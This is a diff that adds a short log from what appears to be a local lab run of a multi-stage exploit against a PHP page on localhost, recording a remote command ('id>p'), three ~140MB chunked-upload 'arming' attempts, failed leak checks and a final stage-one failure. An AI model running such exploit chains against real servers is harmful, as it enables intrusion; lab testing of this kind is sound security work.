@@ -1,0 +1,13 @@
+[12:16:36] target=http://localhost:18113/index.php stage=1 cmd='id>p' log=<repo>/lab/live_run_20261024_121636.log
+[12:16:36] [preflight] GET / -> HTTP/1.1 200 OK (7 bytes)
+[12:16:36] [preflight] GET /p -> HTTP/1.1 404 Not Found (pre-existing body=314 bytes)
+[12:16:36] [stage1] try 1: arming (chunked ~140MB upload)...
+[12:16:38] [stage1] arm done in 2.1s: HTTP/1.1 200 OK
+[12:16:40] [stage1] no valid leak (cookie len=32, resp='HTTP/1.1 200 OK'); retrying
+[12:16:40] [stage1] try 2: arming (chunked ~140MB upload)...
+[12:16:42] [stage1] arm done in 2.1s: HTTP/1.1 200 OK
+[12:16:44] [stage1] no valid leak (cookie len=32, resp='HTTP/1.1 200 OK'); retrying
+[12:16:44] [stage1] try 3: arming (chunked ~140MB upload)...
+[12:16:46] [stage1] arm done in 2.1s: HTTP/1.1 200 OK
+[12:16:48] [stage1] no valid leak (cookie len=32, resp='HTTP/1.1 200 OK'); retrying
+[12:16:48] STAGE 1 FAILED
